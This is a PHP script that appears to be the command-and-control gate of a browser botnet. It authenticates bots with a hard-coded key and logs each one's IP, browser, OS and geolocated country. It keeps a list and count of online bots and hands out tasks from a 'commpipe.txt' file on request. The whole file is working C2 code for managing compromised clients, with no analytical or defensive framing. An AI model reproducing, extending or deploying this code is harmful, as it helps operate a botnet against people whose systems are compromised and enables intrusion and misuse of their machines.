<?php
$connectKey = "js6283h7";

date_default_timezone_set("Canada/Pacific");
$date = date("Y/m/d H:i:s");
$botcountrycode = strtolower(explode(",", @file_get_contents("http://freegeoip.net/csv/" . $_SERVER['REMOTE_ADDR']))[1]);

if(isset($_GET['connect']) && $_GET['connect'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $logfile="./logs/main.txt";
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, "[" . $date . "] [<img src='/flags/" . $botcountrycode . ".gif'/>] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " connected.\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
    $otherlogfile="./logs/botlist.txt";
    $fp = fopen($otherlogfile, "a") or die("Unable to open file!");
    $botlist = explode("\r\n", file_get_contents("./logs/botlist.txt"));
    $botexists = false;
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            $botexists = true;
            //bot is already online. do nothing.
        }
    }
    if(!$botexists) { //bot is not online. add it to the online list
        fwrite($fp, $date . "|" . $botcountrycode . "|" . $browserType . "|" . $OSName . "|" . $_SERVER['REMOTE_ADDR'] . "\r\n") or die("Unable to write to file!");
        file_put_contents("./logs/online.txt",intval(file_get_contents("./logs/online.txt"))+1);
    }
    fflush($fp);
    fclose($fp);
} else if(isset($_GET['disconnect']) && $_GET['disconnect'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $logfile="./logs/main.txt";
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($logfile, "a") or die("Unable to open file!");
    fwrite($fp, "[" . $date . "] [<img src='/flags/" . $botcountrycode . ".gif'/>] [" . $browserType . "] [" . $OSName . "] " . htmlspecialchars($_SERVER['REMOTE_ADDR'], ENT_QUOTES) . " disconnected.\r\n") or die("Unable to write to file!");
    fflush($fp);
    fclose($fp);
    
    $botlist = explode("\r\n", file_get_contents("./logs/botlist.txt"));
    $loc = 0;
    
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            array_splice($botlist, $loc, 1);
        }
        $loc++;
    }
    $otherlogfile="./logs/botlist.txt";
    $fp = fopen($otherlogfile, "w") or die("Unable to open file!");
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        fwrite($fp, $bot . "\r\n") or die("Unable to write to file!");
    }
    fflush($fp);
    fclose($fp);
    $online = intval(file_get_contents("./logs/online.txt"));
    if($online > 0){
        file_put_contents("./logs/online.txt", $online-1);
    } else if($online < 0) {
        file_put_contents("./logs/online.txt", "0");
    }
} else if(isset($_GET['gettasks']) && $_GET['gettasks'] == $connectKey && isset($_GET['browsertype']) && isset($_GET['osname'])) {
    $otherlogfile="./logs/botlist.txt";
    $browserType = htmlspecialchars($_GET['browsertype'], ENT_QUOTES); //XSS security
    $OSName = htmlspecialchars($_GET['osname'], ENT_QUOTES); //XSS security
    $fp = fopen($otherlogfile, "a") or die("Unable to open file!");
    $botlist = explode("\r\n", file_get_contents("./logs/botlist.txt"));
    $botexists = false;
    foreach($botlist as &$bot) {
        $bot = str_replace("\r\n", "", $bot);
        if(strpos($bot, $_SERVER['REMOTE_ADDR']) != false && strpos($bot, $browserType) != false && strpos($bot, $OSName) != false) {
            $botexists = true;
            //bot is already online. do nothing.
        }
    }
    if(!$botexists) { //bot is not online. add it to the online list
        fwrite($fp, $date . "|" . $botcountrycode . "|" . $browserType . "|" . $OSName . "|" . $_SERVER['REMOTE_ADDR'] . "\r\n") or die("Unable to write to file!");
        file_put_contents("./logs/online.txt",intval(file_get_contents("./logs/online.txt"))+1);
    }
    fflush($fp);
    fclose($fp);
    echo file_get_contents("commpipe.txt");
}
?>